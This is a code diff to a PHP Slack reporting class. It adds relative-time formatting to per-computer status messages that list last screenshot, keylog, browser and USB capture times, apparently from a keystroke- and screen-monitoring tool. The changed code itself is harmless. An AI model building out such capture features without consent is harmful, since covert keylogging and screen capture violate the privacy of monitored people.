@@ -15,7 +15,7 @@ class SlackService {
         $this->log_file = SLACK_LOG_FILE;
         
         // Set timezone
-        date_default_timezone_set(SLACK_TIMEZONE);
+        // date_default_timezone_set(SLACK_TIMEZONE);
     }
     
     /**
@@ -191,11 +191,11 @@ class SlackService {
                 $ip = $client['ip_address'] ?? '';
                 $status = $this->getStatusText($client['status']);
                 $statusIcon = $this->getStatusIconSimple($client['status']);
-                $last_update = $this->formatTime($client['last_update']);
-                $screenshot = $this->formatTime($client['last_screenshot']);
-                $keylog = $this->formatTime($client['last_keylog']);
-                $browser = $this->formatTime($client['last_browser']);
-                $usb = $this->formatTime($client['last_usb']);
+                $last_update = $this->formatTimeWithDiff($client['last_update']);
+                $screenshot = $this->formatTimeWithDiff($client['last_screenshot']);
+                $keylog = $this->formatTimeWithDiff($client['last_keylog']);
+                $browser = $this->formatTimeWithDiff($client['last_browser']);
+                $usb = $this->formatTimeWithDiff($client['last_usb']);
                 
                 $code_block = [];
                 $code_block[] = "{$statusIcon} {$computer_name} ({$client['type']}): {$status} from {$last_update}";
@@ -278,6 +278,72 @@ class SlackService {
         }
         
         return date('H:i', strtotime($timestamp));
+    }
+    
+    /**
+     * Format timestamp with time difference (e.g., "10:30 (2h 15m ago)")
+     */
+    private function formatTimeWithDiff($timestamp) {
+        if (empty($timestamp) || $timestamp === '0000-00-00 00:00:00') {
+            return 'Never';
+        }
+        
+        $time_str = date('H:i', strtotime($timestamp));
+        $time_diff = $this->calculateTimeDiff($timestamp);
+        
+        return "{$time_str} ({$time_diff})";
+    }
+    
+    /**
+     * Calculate and format time difference from now
+     * Returns human-readable format like "2h 30m ago", "5m ago", "3d ago"
+     */
+    private function calculateTimeDiff($timestamp) {
+        if (empty($timestamp) || $timestamp === '0000-00-00 00:00:00') {
+            return 'Never';
+        }
+        
+        $timestamp_unix = strtotime($timestamp);
+        $now = time();
+        $diff_seconds = $now - $timestamp_unix;
+        
+        if ($diff_seconds < 0) {
+            return 'Future';
+        }
+        
+        if ($diff_seconds < 60) {
+            return $diff_seconds . 's ago';
+        }
+        
+        $diff_minutes = floor($diff_seconds / 60);
+        if ($diff_minutes < 60) {
+            return $diff_minutes . 'm ago';
+        }
+        
+        $diff_hours = floor($diff_minutes / 60);
+        $remaining_minutes = $diff_minutes % 60;
+        if ($diff_hours < 24) {
+            if ($remaining_minutes > 0) {
+                return $diff_hours . 'h ' . $remaining_minutes . 'm ago';
+            }
+            return $diff_hours . 'h ago';
+        }
+        
+        $diff_days = floor($diff_hours / 24);
+        $remaining_hours = $diff_hours % 24;
+        if ($diff_days < 30) {
+            if ($remaining_hours > 0) {
+                return $diff_days . 'd ' . $remaining_hours . 'h ago';
+            }
+            return $diff_days . 'd ago';
+        }
+        
+        $diff_months = floor($diff_days / 30);
+        $remaining_days = $diff_days % 30;
+        if ($remaining_days > 0) {
+            return $diff_months . 'mo ' . $remaining_days . 'd ago';
+        }
+        return $diff_months . 'mo ago';
     }
     
     /**
